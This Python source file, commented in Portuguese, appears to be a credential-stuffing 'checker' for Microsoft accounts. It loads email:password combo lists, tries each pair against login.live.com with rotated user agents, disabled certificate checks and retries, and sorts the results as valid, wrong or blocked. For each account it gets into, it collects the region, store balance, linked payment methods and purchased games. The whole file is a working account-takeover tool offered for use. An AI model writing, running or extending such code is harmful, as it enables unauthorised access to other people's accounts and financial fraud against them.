import re
import random
import httpx
import asyncio
import logging
import json
from typing import List, Tuple, Optional
from .constants import USER_AGENTS, Microsoft
from .models import Account, LoginStatus, LoginResult

# Configuração de Logging Silenciosa para Performance, mas com registro de erros
logging.basicConfig(
    level=logging.ERROR,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler("errors.log", encoding="utf-8")]
)

class MicrosoftChecker:
    def __init__(self, max_connections: int = 50):
        # Configurações otimizadas para VPN e alta concorrência
        limits = httpx.Limits(
            max_keepalive_connections=max_connections, 
            max_connections=max_connections,
            keepalive_expiry=30.0
        )
        self.client = httpx.AsyncClient(
            follow_redirects=True, 
            timeout=httpx.Timeout(25.0, connect=10.0, read=15.0),
            limits=limits,
            verify=False, # Ignora erros de SSL comuns em VPNs
            http2=True    # Melhora performance em conexões modernas
        )

    async def close(self):
        await self.client.aclose()

    def _extract_data(self, html: str) -> Tuple[str, str, str]:
        """Extração de tokens com múltiplos padrões de segurança."""
        ppft = ""
        # Padrão 1: Atributo value
        ppft_match = re.search(r'name="PPFT".*?value="([^"]+)"', html)
        if not ppft_match:
            # Padrão 2: JSON inline
            ppft_match = re.search(r'sFT":"([^"]+)"', html)
        if ppft_match:
            ppft = ppft_match.group(1)

        url_post = Microsoft.POST_LOGIN_URL
        url_post_match = re.search(r'urlPost":"([^"]+)"', html)
        if url_post_match:
            url_post = url_post_match.group(1).replace("\\u003a", ":").replace("\\u002f", "/")

        uaid = ""
        uaid_match = re.search(r'uaid=([^&"]+)', html)
        if uaid_match:
            uaid = uaid_match.group(1)

        return ppft, url_post, uaid

    async def _safe_request(self, method: str, url: str, **kwargs) -> Optional[httpx.Response]:
        """Executa requisições com retry inteligente para instabilidades de VPN."""
        for attempt in range(3): # 3 tentativas para garantir estabilidade
            try:
                return await self.client.request(method, url, **kwargs)
            except (httpx.RequestError, httpx.TimeoutException):
                if attempt < 2:
                    await asyncio.sleep(random.uniform(0.5, 1.5))
                continue
            except Exception:
                break
        return None

    async def _get_account_data(self, user_agent: str) -> Tuple[str, str, List[str]]:
        """Captura Região, Saldo e Jogos em uma única lógica paralela."""
        region, balance, games = "N/A", "N/A", []
        
        headers = Microsoft.Headers.GET_JSON.copy()
        headers["User-Agent"] = user_agent

        # 1. Busca Região e Saldo (Endpoints leves)
        tasks = [
            self._safe_request("GET", Microsoft.GET_PERSONAL_INFO, headers=headers),
            self._safe_request("GET", Microsoft.GET_PAYMENT_INSTRUMENTS, headers=headers)
        ]
        responses = await asyncio.gather(*tasks)

        # Processa Região
        if responses[0] and responses[0].status_code == 200:
            try:
                data = responses[0].json()
                region = data.get('countryRegion') or data.get('country') or "N/A"
            except: pass

        # Processa Saldo
        if responses[1] and responses[1].status_code == 200:
            try:
                data = responses[1].json()
                balances = [f"{i.get('details',{}).get('balance','0')} {i.get('details',{}).get('currency','')}" 
                            for i in data.get('paymentInstruments', []) if i.get('type') == 'MicrosoftBalance']
                balance = ", ".join(balances) if balances else "0.00"
            except: pass

        # 2. Busca Jogos (Endpoint mais pesado)
        params = {"period": "AllTime", "orderTypeFilter": "All", "isInD365Orders": "true", "isPiDetailsRequired": "true"}
        resp_games = await self._safe_request("GET", Microsoft.GET_ORDERS, headers=headers, params=params)
        if resp_games and resp_games.status_code == 200:
            try:
                data = resp_games.json()
                for order in data.get('orders', []):
                    p_methods = [f"{pi.get('displayName')} ({pi.get('type')})" for pi in order.get('paymentInstrumentDetails', [])]
                    p_str = ", ".join(p_methods) if p_methods else "N/A"
                    for item in order.get('items', []):
                        name = item.get('productName')
                        if name: games.append(f"{name} [{p_str}]")
            except: pass
        
        return str(region), str(balance), list(set(games))

    async def check_account(self, account: Account) -> LoginResult:
        ua = random.choice(USER_AGENTS)
        res = LoginResult(status=LoginStatus.SESSAO_BLOQUEADA, email=account.email, password=account.password)
        
        try:
            # Passo 1: Handshake Inicial
            resp = await self._safe_request("GET", "https://login.live.com/", headers={"User-Agent": ua})
            if not resp: 
                res.status = LoginStatus.ERRO_REDE
                return res
            
            ppft, log_url, _ = self._extract_data(resp.text)
            if not ppft: return res

            # Passo 2: Autenticação
            payload = {
                "login": account.email, "loginfmt": account.email, "passwd": account.password, 
                "PPFT": ppft, "type": "11", "LoginOptions": "3", "ps": "2"
            }
            resp = await self._safe_request("POST", log_url, headers={"User-Agent": ua, "Referer": "https://login.live.com/"}, data=payload)
            
            if not resp:
                res.status = LoginStatus.ERRO_REDE
                return res
            
            html = resp.text

            # Verificação de Falha
            if any(msg in html for msg in ["incorrect account or password", "A conta ou a senha está incorreta", "senha incorreta"]):
                res.status = LoginStatus.ERRO_CREDENCIAIS
                return res
            
            if any(msg in html for msg in ["JavaScript required", "tried to sign in too many times", "ajude-nos a proteger"]):
                res.status = LoginStatus.SESSAO_BLOQUEADA
                return res

            # Passo 3: Sucesso - Captura de Dados
            res.status = LoginStatus.LOGADO
            res.region, res.balance, res.games = await self._get_account_data(ua)
            return res

        except Exception as e:
            res.error_message = str(e)
            return res

class AccountLoader:
    @staticmethod
    def load(file_path: str) -> List[Account]:
        accounts = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or ":" not in line:
                        continue
                    try:
                        u, p = line.split(':', 1)
                        accounts.append(Account(u.strip(), p.strip()))
                    except ValueError:
                        continue
        except Exception as e:
            logging.error(f"Erro ao carregar arquivo: {e}")
        return accounts
